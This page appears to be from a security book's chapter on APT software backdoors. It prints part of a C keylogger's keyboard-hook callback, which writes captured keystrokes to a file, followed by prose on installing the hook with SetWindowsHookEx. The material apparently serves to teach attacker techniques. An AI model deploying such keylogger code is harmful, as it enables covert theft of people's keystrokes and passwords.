<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1b4" class="pf w2 h2" data-page-no="1b4"><div class="pc pc1b4 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">413</span></div><div class="t m0 x3 h40 ya7f fff fs5 fc0 sc0 ls0 ws0">if (key &gt;=65 &amp;&amp; key &lt;=90)</div><div class="t m0 x3 h40 ya80 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 ya81 fff fs5 fc0 sc0 ls0 ws0"> if (GetKeyState(VK_CAPITAL) || GetKeyState(VK_LSHIFT) &lt; 0 )</div><div class="t m0 x3 h40 ya82 fff fs5 fc0 sc0 ls0 ws0"> fprintf(outFile,"%s",&amp;key);</div><div class="t m0 x3 h40 y259c fff fs5 fc0 sc0 ls0 ws0"> else</div><div class="t m0 x3 h40 y259d fff fs5 fc0 sc0 ls0 ws0"> {</div><div class="t m0 x3 h40 y259e fff fs5 fc0 sc0 ls0 ws0">  key = key +32;</div><div class="t m0 x3 h40 y259f fff fs5 fc0 sc0 ls0 ws0">  fprintf(outFile,"%s",&amp;key);</div><div class="t m0 x3 h40 y25a0 fff fs5 fc0 sc0 ls0 ws0"> }</div><div class="t m0 x3 h40 y25a1 fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h40 y273a fff fs5 fc0 sc0 ls0 ws0">else</div><div class="t m0 x3 h40 y273b fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y273c fff fs5 fc0 sc0 ls0 ws0"> switch (key)</div><div class="t m0 x3 h40 y273d fff fs5 fc0 sc0 ls0 ws0"> {</div><div class="t m0 x3 h40 y273e fff fs5 fc0 sc0 ls0 ws0"> case 8:</div><div class="t m0 x3 h40 y273f fff fs5 fc0 sc0 ls0 ws0">      fprintf(outFile,"%s","[del]");</div><div class="t m0 x3 h40 y2740 fff fs5 fc0 sc0 ls0 ws0">      break;</div><div class="t m0 x3 h40 y2741 fff fs5 fc0 sc0 ls0 ws0"> case 13:</div><div class="t m0 x3 h40 y2742 fff fs5 fc0 sc0 ls0 ws0">      fprintf(outFile,"%s","\n");</div><div class="t m0 x3 h40 y2743 fff fs5 fc0 sc0 ls0 ws0">      break;</div><div class="t m0 x3 h40 y2744 fff fs5 fc0 sc0 ls0 ws0"> case 160:</div><div class="t m0 x3 h40 y2745 fff fs5 fc0 sc0 ls0 ws0">      fprintf(outFile, "%s", "[LSHIFT]");</div><div class="t m0 x3 h40 y2746 fff fs5 fc0 sc0 ls0 ws0">      break;</div><div class="t m0 x3 h40 y2747 fff fs5 fc0 sc0 ls0 ws0"> case 161:</div><div class="t m0 x3 h40 y262b fff fs5 fc0 sc0 ls0 ws0">       fprintf(outFile, "%s", "[RSHIFT]");</div><div class="t m0 x3 h40 y2748 fff fs5 fc0 sc0 ls0 ws0">       break;</div><div class="t m0 x3 h40 y2749 fff fs5 fc0 sc0 ls0 ws0"> default :</div><div class="t m0 x3 h40 y274a fff fs5 fc0 sc0 ls0 ws0">     break;</div><div class="t m0 x3 h40 y274b fff fs5 fc0 sc0 ls0 ws0"> }</div><div class="t m0 x3 h40 y202c fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h40 y274c fff fs5 fc0 sc0 ls0 ws0">fclose(outFile);</div><div class="t m0 x3 h40 y274d fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x4 hd y274e ff4 fs7 fc0 sc0 ls0 ws0">In this example, we start by creating the <span class="_ _0"/>W<span class="_ _2"/>indows hook using the </div><div class="t m0 x3 hd y274f ff4 fs7 fc0 sc0 ls0 ws0">SetW<span class="_ _0"/>indo<span class="_ _0"/>wsHookEx function, which instructs <span class="_ _0"/>W<span class="_ _0"/>indo<span class="_ _0"/>ws to hook the ke<span class="_ _0"/>yboard with </div><div class="t m0 x3 hd y2750 ff4 fs7 fc0 sc0 ls0 ws0">the î€‚rst argument (13) and use our callback function of K<span class="_ _0"/>e<span class="_ _0"/>yboardHook:</div><div class="t m0 x3 h44 y2751 fff fse fc0 sc0 ls0 ws0">hHook = SetWindowsHookEx(13, KeyboardHook, hInstance , 0);</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>